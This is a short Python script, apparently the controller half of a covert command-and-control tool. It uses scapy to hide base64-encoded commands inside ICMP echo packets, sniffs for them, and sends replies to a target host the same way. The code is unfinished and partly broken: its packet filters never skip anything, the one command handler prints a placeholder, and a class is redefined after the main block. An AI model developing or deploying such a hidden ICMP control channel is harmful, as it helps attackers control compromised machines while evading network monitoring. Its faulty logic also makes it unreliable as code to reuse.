#!/usr/bin/python3

from scapy.all import sr,IP,ICMP,Raw,sniff
import os
import socket
import psutil
import pwd
import base64
from multiprocessing import Process
import json
import ast
from shelly import Host, Target

TTL = int(64)
ICMP_ID = int(12800)

class Controller(Host):
    
    def __init__(self):
        super().__init__()
        self.type = "controller"

    def sniff_callback(self, packet):
        if packet[ICMP].type != 8:
            pass
        elif packet[ICMP].id != ICMP_ID:
            pass
        elif not packet[Raw].load:
            pass

        encoded_shellpack = (packet[Raw].load).decode('utf-8', errors='ignore')
        shellpack = base64.b64decode(encoded_shellpack).decode()
        unpacked = ast.literal_eval(shellpack)
        
        match unpacked['command']:
            case "join":
                print("fart")
        
        print(self.type)
        print(unpacked['command'])

def sniffing(controller):
     sniff(iface=controller.iface, filter="icmp", prn=controller.sniff_callback, store="0")

def setup_controller() -> Controller:
    print("[ Setting up controller... ]")
    controller = Controller()
    print(controller)

    return controller


if __name__ == "__main__":
    controller = setup_controller()

    sniffing = Process(target=sniffing, args=(controller,))
    sniffing.start()
    
    print("Starting listener")
    while True:
        input("")

class Target:
    def __init__(self, ip):
        self.ip = ip
    
    def send(self, shellpack: str) -> bool:
        data = (IP(dst=self.ip, ttl=TTL)/ICMP(type=0, id=ICMP_ID)/Raw(load=shellpack))
        sr(data, timeout=0, verbose=0)
        
        return True